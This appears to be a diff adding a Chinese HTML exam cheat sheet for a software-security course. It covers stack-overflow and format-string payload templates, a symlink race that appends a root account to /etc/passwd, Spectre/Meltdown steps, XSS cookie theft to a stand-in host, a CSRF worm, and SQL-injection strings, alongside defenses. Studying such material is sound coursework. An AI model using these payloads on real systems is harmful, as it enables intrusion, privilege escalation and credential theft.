@@ -1,0 +1,302 @@
+﻿<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<title>SFS 期末 Cheat Sheet</title>
+<style>
+  @page { size: A4; margin: 6mm 6mm 5mm 6mm; }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: "Microsoft YaHei", "Segoe UI", sans-serif;
+    font-size: 7.75pt;
+    line-height: 1.34;
+    color: #000;
+  }
+  .page {
+    column-count: 3;
+    column-gap: 4mm;
+    column-rule: 0.3pt solid #bbb;
+    height: 285mm;
+    column-fill: auto;
+  }
+  .page + .page { break-before: page; }
+  .page.bal { column-fill: balance; column-count: 2; }
+  h1 {
+    column-span: all;
+    font-size: 9pt;
+    margin: 0 0 1.4mm 0;
+    padding: 0.6mm 1mm;
+    border-bottom: 0.8pt solid #000;
+    letter-spacing: 0.4pt;
+  }
+  h2 {
+    font-size: 8.3pt;
+    margin: 1.8mm 0 0.8mm 0;
+    padding: 0.6mm 1mm;
+    background: #000;
+    color: #fff;
+    break-after: avoid;
+  }
+  h3 {
+    font-size: 7.8pt;
+    margin: 1.2mm 0 0.4mm 0;
+    border-bottom: 0.4pt dotted #666;
+    break-after: avoid;
+  }
+  p { margin: 0.5mm 0; }
+  ul { margin: 0.4mm 0 0.6mm 0; padding-left: 3.2mm; }
+  li { margin: 0.3mm 0; }
+  code {
+    font-family: Consolas, "Cascadia Mono", monospace;
+    font-size: 6.9pt;
+    background: #f2f2f2;
+    padding: 0 0.5mm;
+  }
+  pre {
+    font-family: Consolas, "Cascadia Mono", monospace;
+    font-size: 6.6pt;
+    line-height: 1.24;
+    margin: 0.6mm 0;
+    padding: 0.9mm 1mm;
+    background: #f2f2f2;
+    border-left: 1.2pt solid #000;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+  .sym {
+    background: #ececec;
+    border-left: 1.2pt solid #555;
+    padding: 0.8mm 1.2mm;
+    margin: 0.8mm 0;
+    font-size: 6.9pt;
+  }
+  .key { font-weight: 700; margin-top: 0.8mm; }
+  table { width: 100%; border-collapse: collapse; font-size: 6.8pt; margin: 0.8mm 0; }
+  th { background: #ddd; text-align: left; padding: 0.5mm 1mm; font-weight: 700; }
+  td { border-bottom: 0.3pt solid #ccc; padding: 0.5mm 1mm; vertical-align: top; }
+  .q { background: #e8e8e8; }
+  .tag { display: inline-block; font-size: 5.9pt; border: 0.4pt solid #000; padding: 0 0.6mm; margin-right: 0.8mm; }
+  .imp { background: #fff3cd; }
+  small { font-size: 6.3pt; }
+</style>
+</head>
+<body>
+
+<!-- ==================== PAGE 1 ==================== -->
+<div class="page">
+<h1>SFS 期末 Cheat Sheet（正）　Ⅰ 栈溢出通解　·　Ⅱ 格式化字符串通解</h1>
+
+<h2>Ⅰ 栈溢出：一套通解打所有数据</h2>
+<div class="sym"><b>符号</b>：<b>B</b> = buffer 地址　<b>E</b> = ebp(32)/rbp(64) 地址　<b>W</b> = 字宽 4 或 8　<b>L</b> = 输入长度上限（badfile 大小）　<b>s</b> = shellcode 长度　<b>Δ</b> = shellcode 相对 B 的偏移</div>
+
+<p class="key">核心只有两式</p>
+<pre>off = E − B + W            # 返回地址相对 buffer 的偏移
+ret = B + Δ                # 要写进 ret 槽位的值（指向 shellcode/sled）</pre>
+
+<h3>① 求 off：按「已知程度」分三种</h3>
+<table>
+<tr><th style="width:34%">题目给了什么</th><th>怎么定 off</th></tr>
+<tr><td>B 和 E 都给</td><td>直接代入，<b>off 唯一</b></td></tr>
+<tr><td>只给 B，E 未知（打码、帧大小不定）</td><td>把 off 看成区间 <code>[lo, hi]</code>，步长 W，<b>每个槽位都写同一个 ret</b></td></tr>
+<tr><td>B、E 都不给（ASLR）</td><td>先泄漏（<code>%p</code>／程序打印）拿 B；或爆破：只随机低 16 位，按页猜</td></tr>
+</table>
+
+<h3>② 拼 payload：与具体数值无关的模板</h3>
+<pre>P = bytearray(b'\x90' * L)          # ① 全填 NOP
+P[Δ : Δ+s] = SC                     # ② 放 shellcode
+for k in range(lo, hi+1, W):        # ③ 覆盖所有可能的 ret 槽位
+    P[k : k+W] = le(B + Δ, W)       #    小端写地址
+send(P)</pre>
+<p>两种放法二选一：<b>尾部</b>（<code>Δ = L−s</code>，ret 指向 sled 中部，容错最大）／<b>最前面</b>（<code>Δ = 0</code>，64 位或 <code>\x00</code> 截断时用）。<br>
+<span class="imp">给了 E：<code>lo = hi = off</code>；<b>没给 E：<code>lo = off_min, hi = off_max</code>，这一行就把「全部填满」的题解掉了</b>。</span></p>
+<table style="table-layout:fixed;font-size:6.6pt">
+<tr>
+<td style="background:#e8f5e9;text-align:center"><b>NOP sled</b><br>0 … Δ</td>
+<td style="background:#fff3cd;text-align:center"><b>shellcode</b><br>Δ … Δ+s</td>
+<td style="text-align:center">填充</td>
+<td style="background:#f8d7da;text-align:center"><b>ret × k</b><br>off … off+W·k</td>
+</tr>
+</table>
+<p><small><b>payload 布局</b>（所有变体共用）：低地址 → 高地址。<code>k</code> = 要覆盖的槽位数（已知 E 时 k=1，扫区间时 k=(hi−lo)/W+1），<b>每个槽位写同一个 B+Δ</b>。</small></p>
+
+<h3>③ 三个必查的坑（无关数据、必错点）</h3>
+<ul>
+<li><b>小端</b>：<code>le(addr, W)</code> 低字节在前，32 位 4 字节、64 位 8 字节。</li>
+<li><b><code>\x00</code> 截断</b>：<code>strcpy</code>/<code>scanf</code> 遇到 0 就停 → 含 <code>\x00</code> 的地址必须放在 payload <b>最末尾</b>，或让 <code>Δ = 0</code>（shellcode 在前，ret 之后无内容）。</li>
+<li><b>长度上限</b>：若 <code>L ≤ off</code>，根本盖不到 ret → 只能改相邻变量/函数指针，不能套本模板。</li>
+</ul>
+
+<h3>④ 四种变体 = 同一模板换参数</h3>
+<table>
+<tr><th style="width:30%">变体</th><th>变的只有</th></tr>
+<tr><td>32 位、地址固定</td><td><code>W=4</code>，off 唯一，Δ 取 sled 中部</td></tr>
+<tr><td>buffer 小、输入大</td><td><code>lo..hi</code> 扫整段（如 <code>100..256</code> 步长 4），<code>ret = B+Δ</code> 固定</td></tr>
+<tr><td>64 位</td><td><code>W=8</code>，<code>off = E−B+8</code>，<code>Δ=0</code>（shellcode 放最前）</td></tr>
+<tr><td>开 ASLR</td><td>B、E 随机 → 先泄漏或爆破，模板不变</td></tr>
+</table>
+
+<h3>⑤ 拿 B、E 的四条路</h3>
+<ul>
+<li>程序自己打印（本题）→ 直接代入公式。</li>
+<li>格式化串泄漏：<code>%p</code> 输出里通常就有栈地址。</li>
+<li>gdb：<code>p &amp;buffer</code>、<code>p $ebp</code>（同进程、ASLR 关）。</li>
+<li>shellcode 放环境变量/argv，栈顶地址相对稳定。</li>
+</ul>
+
+<h3>⑥ 两个常见变体（模板不变）</h3>
+<ul>
+<li><b>NX 栈不可执行</b>：不能 ret2shellcode → 改 ret2libc/ROP，<b>结构仍是"覆盖 ret"</b>，只是 ret 换成 gadget 链。</li>
+<li><b>能写 <code>\x00</code> 的输入</b>（<code>read</code>/<code>fgets</code>）：ret 可写满 8 字节，不用回避 0。</li>
+</ul>
+
+<pre># ⑦ 32 / 64 位模板对照
+# 32 位：off = E-B+4
+P[off:off+4] = le32(B+Δ)
+# 64 位：off = E-B+8，shellcode 放最前 Δ=0
+P[off:off+8] = le64(B)     # 末尾 \x00 → 放在 payload 最后
+</pre>
+
+<h3>⑧ 套小测题</h3>
+<ul>
+<li>给 <code>B=0x00BBCC00</code>、<code>E=0x00BBCD00</code> → <code>off = E−B+W = 0x104</code>，<code>ret = B+Δ</code>（Δ 取 4 或 sled 中部）。</li>
+<li>E 被打码 <code>0xAABB8**0</code> → 算不出唯一 off → 用 <code>for k in range(lo,hi+1,W)</code> 全填，<b>这就是"把所有可能位置都填上"的通用理由</b>。</li>
+<li>答辩三件套：栈示意图（buffer→ebp→ret）＋ 为什么全覆盖更稳 ＋ 小端。</li>
+</ul>
+
+<h2>Ⅱ 格式化字符串：一套通解打所有数据</h2>
+<div class="sym"><b>符号</b>：<b>B</b> = fmt 指向的 buffer 地址　<b>W</b> = 4/8　<b>p</b> = buffer[0] 对应的<b>参数序号</b>　<b>K</b> = 地址表在 buffer 里的偏移　<b>C</b> = 累计已输出字符数　<b>V</b> = 目标地址　<b>X</b> = 要写入的值</div>
+
+<p class="key">核心恒等式（一切定位都靠它）</p>
+<pre>参数序号 = p + K / W
+# 32 位例：p=64，K=1000 → 第 64+250 = 314 个参数 = buffer[1000]
+# 64 位例：p=159，K=1000 → 第 159+125 = 284 个参数</pre>
+
+<h3>① 先测 p：buffer[0] 是第几个参数</h3>
+<ul>
+<li>32 位：发 <code>"%x"*n</code>，输出里等于 <b>B</b>（或特征值 <code>0x41414141</code>）的那个就是 p。<b>参数全在栈上</b>。</li>
+<li>64 位：发 <code>"%p"*n</code>；前 6 个在寄存器 <code>rdi,rsi,rdx,rcx,r8,r9</code>，<b>%7 起才在栈上</b>。</li>
+<li>payload：<code>"AAAA" + "%p"*n</code> → 找 <code>0x41414141</code> 最稳。</li>
+</ul>
+
+<h3>② 任意读：把地址塞进参数区</h3>
+<pre>P = le(V, W) + f"%{p}$s".encode()    # 地址在 buffer[0] → 就是第 p 个参数
+# 等价顺序写法（不用 $）：地址放 buffer[0]，第 p 个 %x 换成 %s</pre>
+<p>32 位 4 字节地址正好占一个参数；64 位 8 字节占一个参数。<code>%s</code> 把该参数<b>当地址</b>解引用。</p>
+
+<h3>③ 任意写：小值直接用 %n，大值拆字节</h3>
+<p><b>值 X 小</b>（<code>X</code> 不超过几万）：<code>P = le(V,W) + f"%{X}d%n"</code> → 输出 X 个字符后把计数写进 V。</p>
+<p><b>值 X 任意（通解）</b>：</p>
+<pre>bs = [(X>>8*i)&0xff for i in range(4)]        # 或 6 个（64 位）
+items = sorted(zip(bs, [V+i for i in range(4)]))   # ① 按字节值升序
+# ② 地址表放 buffer[K]，K 对齐且 > len(fmt)
+# ③ 前面用 K//W 个 %x 把游标推到地址表
+# ④ 依次补差值：d1 = v1 - C0，di = vi - v(i-1)（负数就 +256）
+fmt = "%x"*(K//W) + f"%{d1}d%hhn" + f"%{d2}d%hhn" + f"%{d3}d%hhn" + f"%{d4}d%hhn"</pre>
+<p><span class="imp">为什么必须升序：<code>%hhn</code> 写的是<b>累计</b>输出数，只能增不能减 → 按字节值从小到大排，差值才为正；不够一圈就 <code>+256</code> 再绕。</span></p>
+
+<h3>④ 改返回地址 = 把 V 换成 ret 槽位</h3>
+<pre>V = E + W          # ret 的地址
+X = B + Δ          # 想跳到的 shellcode 地址
+# 然后套 ③ 的拆字节流程即可</pre>
+<p>64 位：返回地址 8 字节，但高 2 字节本来就是 <code>0x0000</code>，<b>只写低 6 字节</b>（6 次 <code>%hhn</code>），否则会把高位改成非零而崩溃。</p>
+
+<h3>⑤ 双候选地址（小测原题）通解</h3>
+<ul>
+<li>题目给 A1、A2 两个可能的 ret 位置、<b>不知道用哪个</b> → <b>两处都写成同一个 X</b>。</li>
+<li>把 A1、A2 的地址都放进地址表；先写完第一处的 4 字节，再写第二处（同值 → 第 5 段差值为 0，或 <code>+256</code>）。</li>
+<li>用 <code>B−C = 0x40</code>（=16 个参数位）把地址表的序号算出来：<code>序号 = p + 16</code>。</li>
+<li>题目禁止 <code>%n</code> 时：全部改 <code>%hn</code>/<code>%hhn</code>，并逐步写出「此刻累计输出了多少字符」——<b>这是给分点</b>。</li>
+</ul>
+
+<h3>⑥ %n 家族：写几字节、值是多少</h3>
+<table>
+<tr><th style="width:18%">写法</th><th style="width:20%">写几字节</th><th style="width:30%">写入值</th><th>用在哪</th></tr>
+<tr><td><code>%n</code></td><td>4</td><td>C</td><td>一次写小值</td></tr>
+<tr><td><code>%hn</code></td><td>2</td><td>C &amp; 0xffff</td><td>拆 2 段</td></tr>
+<tr><td><code>%hhn</code></td><td>1</td><td>C &amp; 0xff</td><td>拆 4/6 段（通解）</td></tr>
+</table>
+<p>C = <b>到目前为止</b> printf 已输出的字符数，所以 <code>%Nd</code> 的 N 是"<b>要补到多少</b>"而不是绝对值：<code>N_i = (v_i − C_{i−1}) mod 256</code>，算出 0 就写 256。<br>
+<span class="imp">技巧：前面的 <code>%x</code> 换成 <code>%8x</code>（定宽 8），C₀ 就能精确算成 <code>8·(K/W)</code>，不用逐个去数。</span></p>
+
+<h3>⑦ 目标不止 ret</h3>
+<ul>
+<li><b>GOT 表项</b>（如 <code>printf@got</code>）→ 改成 system/one-gadget，但要先泄漏 libc 基址。</li>
+<li><b>函数指针、栈上的指针变量</b> → 同样"把它当地址 V"套 ③。</li>
+<li><b>读</b>：<code>%s</code> 读 GOT 项 → 得到 libc 地址，配合上面的写完成"泄漏 + 劫持"。</li>
+</ul>
+
+<h3>⑧ 三个必查的坑</h3>
+<ul>
+<li><b>地址必须对齐</b>：32 位 4 字节、64 位 8 字节对齐，否则 <code>%s/%n</code> 取到错位的值。</li>
+<li><b>K 要 > len(fmt)</b>：地址表不能被格式串覆盖（这也是为什么放 1000 而不是 0）。</li>
+<li><b>为 0 的字节</b>：<code>%hhn</code> 写 0 需要 <code>+256</code> 绕圈，或放在第一个写（此时 C0 已非 0，要算 mod 256）。</li>
+</ul>
+</div>
+
+<!-- ==================== PAGE 2 ==================== -->
+<div class="page bal">
+<h1>SFS 期末 Cheat Sheet（反）　Ⅲ Set-UID/TOCTOU　Ⅳ 侧信道　Ⅴ XSS　Ⅵ SQL　Ⅶ 通用　Ⅷ 速判　Ⅸ 模板</h1>
+
+<h2>Ⅲ Set-UID 与 TOCTOU（精简）</h2>
+<p><b>两个身份</b>：real UID = <code>getuid()</code>（你是谁）；effective UID = <code>geteuid()</code>（系统按谁判权限）。Set-UID(<code>4755</code>) 被 seed 跑时 euid=root。</p>
+<p><b>漏洞骨架</b>：<code>access(fn,W_OK)</code> 用 <b>real</b> 判 → <code>fopen(fn,"a+")</code> 用 <b>euid=root</b> 开。两次调用之间把 <code>/tmp/XYZ</code> 从「自己的普通文件」换成「指向 /etc/passwd 的软链」。</p>
+<pre>echo dummy > /tmp/XYZ ; rm -f /tmp/XYZ ; ln -s /etc/passwd /tmp/XYZ
+# 稳定版：一次系统调用原子交换两个路径
+while(1) renameat2(0,X,0,A,RENAME_EXCHANGE);
+# 追加进 /etc/passwd 的一行：
+x:U6aMy0wojraho:0:0::/root:/bin/bash</pre>
+<p><b>防御</b>：① 最小权限 <code>seteuid(real)</code> → 检查+打开 → <code>seteuid(eff)</code> 写 → 降回；② <code>fs.protected_symlinks=1</code>：仅当「sticky 世界可写目录 + 链接 owner≠euid + 目录 owner≠euid」才拒绝跟随（<b>不防硬链接、不防其它 TOCTOU</b>）。</p>
+<div class="q"><b>小测要点</b>：<code>lstat</code> 查类型+属主 <b>挡不住</b>（A 时指向自己的普通文件、C 时已换成 /etc/protected）；<b>再加一次 lstat 也没用</b>，窗口只是变窄；<code>fp</code> 一旦打开就绑定 inode，换路径名不影响它 → 要用 <code>fstat(fileno(fp))</code> 校验 fd。<br>
+<b>reportdesk 三洞</b>：① <code>strncmp(argv[1],prefix,17)</code> 只比前缀 → <code>/opt/lab/reports/../../etc/passwd</code> 穿越；② fd 未带 <code>O_CLOEXEC</code> 会漏进 shell（本题带了，故不成立）；③ <code>REPORT_AUDIT</code> 来自 <code>getenv</code> → 可指向任意文件。</div>
+
+<h2>Ⅳ Spectre / Meltdown（精简）</h2>
+<p><b>侧信道</b>：<code>_mm_clflush(&amp;a)</code> 逐出 → 触发受害代码 → <code>clock_gettime</code> 计时 reload。<b>命中快（约 20~30）、未命中慢（200+），阈值取 81</b>。</p>
+<p><b>Spectre 四步</b>：① <code>for i in 0..9 { clflush(&amp;size); victim(i) }</code> 训练；② 传越界 <code>x</code>，CPU 预测「仍为小」→ 乱序执行 <code>array[s*4096+DELTA]+=88</code>；③ 该页进 cache；④ reload 256 页取最快者 = 秘密字节。</p>
+<ul>
+<li>删掉 <code>clflush(&amp;size)</code> → 成功率断崖：size 还在 cache，<b>不必投机</b>就够快。</li>
+<li><code>victim(i+20)</code> → 失败：训练成「预测越界」，越界结果本来就不用丢弃，<b>没有投机窗口</b>。</li>
+<li><code>s=0</code> 会污染第 0 页 → <code>max</code> 与循环都<b>从 1 开始</b>。</li>
+</ul>
+<p><b>Meltdown</b>：直接读内核地址 → 异常提交前乱序把 <code>array[k*4096]</code> 拉进 cache → <code>setjmp/longjmp</code> 捕 SIGSEGV 后 reload。</p>
+<p><b>对比</b>：共同 = 乱序执行 + 侧信道；不同 = Meltdown 读<b>内核/跨进程</b>、<b>不需训练</b>；Spectre 读<b>同进程沙盒</b>、<b>需训练分支预测</b>。防：KPTI、<code>lfence</code>、微码。</p>
+
+<h2>Ⅴ XSS（简）</h2>
+<pre>&lt;script&gt;alert(1)&lt;/script&gt;                        # 能执行
+&lt;script&gt;new Image().src='http://att/?c='+document.cookie&lt;/script&gt;   # 外带
+# 读 CSRF token 后伪造请求（同源才能读）
+ts="&amp;__elgg_ts="+elgg.security.token.__elgg_ts;
+tk="&amp;__elgg_token="+elgg.security.token.__elgg_token;
+GET /action/friends/add?friend=59 + ts + tk</pre>
+<p><b>蠕虫</b>：<code>getElementById("worm").innerHTML</code> 取自身 → <code>encodeURIComponent</code> → 写回 description；<code>if(guid!=59)</code> 防止改掉自己。<br>
+<b>CSP</b>：<code>script-src 'self' *.example70.com</code> 无 <code>'unsafe-inline'</code> → 内联全禁；<code>'nonce-xxx'</code> <b>逐个比对</b>；<code>onclick=</code> 也算内联，同样被拦。</p>
+
+<h2>Ⅵ SQL 注入（简）</h2>
+<p><b>登录绕过</b>：<code>admin'#</code> → <code>WHERE name='admin'#' and Password='…'</code>，密码条件被注释。命令行：<code>%27</code>='<code>%23</code>=#<code>%20</code>=空格。<br>
+<b>多语句不行</b>：<code>mysqli::query()</code> 只执行一条。</p>
+<pre>nickname = ', salary=1 WHERE name='Boby'; #
+nickname = ', Password='7c4a8d09…' WHERE name='Boby';#   # sha1("123456")</pre>
+<p><b>防御</b>：<code>prepare("… WHERE name=? and Password=?")</code> → <code>bind_param("ss",…)</code> → <code>execute()</code>。<b>先编译骨架、后绑数据</b>，输入永远进不了语法。</p>
+
+<h2>Ⅶ 通用：一条主线 + 答题模板</h2>
+<p><b>共同根因</b>：不可信输入被当成了<b>代码/控制数据</b>——栈溢出（数据改返回地址）、格式化串（数据当格式指令）、SQL（数据当语句）、XSS（数据当 JS）、TOCTOU（检查与使用不同时机）。</p>
+<p><b>防御四层</b>：输入（长度/白名单/上下文转义）｜内存（canary、NX、ASLR、PIE、<code>printf("%s",m)</code>）｜权限（最小权限、<code>O_CLOEXEC</code>、<code>NOFOLLOW</code>、<code>fstat</code>）｜Web（CSP+nonce、HttpOnly、CSRF token、Prepared Statement）。</p>
+<div class="q"><b>答题模板</b>：① 漏洞点（哪行、缺什么检查）→ ② 触发条件（能控制什么、有无窗口）→ ③ 具体构造（payload/时序/地址，<b>给分最密</b>）→ ④ 后果（读/写/执行什么）→ ⑤ 修复（哪一层、为什么有效）。</div>
+<h2>Ⅷ 题型速判：看到题干先对号</h2>
+<table>
+<tr><th style="width:52%">题干关键词</th><th>套哪一套</th></tr>
+<tr><td><code>strcpy</code>、badfile、打印 buffer/ebp、栈示意图</td><td><b>Ⅰ 栈溢出通解</b></td></tr>
+<tr><td><code>printf(msg)</code>、<code>%x</code>/<code>%n</code>、格式串、构造输入</td><td><b>Ⅱ 格式化串通解</b></td></tr>
+<tr><td>Set-UID、<code>access</code>、符号链接、<code>/tmp/XYZ</code></td><td>Ⅲ TOCTOU</td></tr>
+<tr><td>cache、分支预测、乱序、<code>clflush</code></td><td>Ⅳ 侧信道</td></tr>
+<tr><td>profile、<code>&lt;script&gt;</code>、cookie、CSP</td><td>Ⅴ XSS</td></tr>
+<tr><td>登录、<code>WHERE</code>、<code>UPDATE</code>、salary</td><td>Ⅵ SQL</td></tr>
+</table>
+
+<h2>Ⅸ 答题模板</h2>
+<div class="q">① 漏洞点（哪行、缺什么检查）→ ② 触发条件（能控制什么、有无窗口）→ ③ <b>具体构造</b>（payload / 时序 / 地址，给分最密）→ ④ 后果（读/写/执行什么）→ ⑤ 修复（哪一层、为什么有效）。</div>
+<p><small>口诀：<b>栈溢出=填满再跳；格式化=先测 p 再用 K/W 定位；SetUID=换链接；侧信道=先清缓存；XSS=读 token 发请求；SQL=闭合引号加注释。</b></small></p>
+</div>
+
+</body>
+</html>
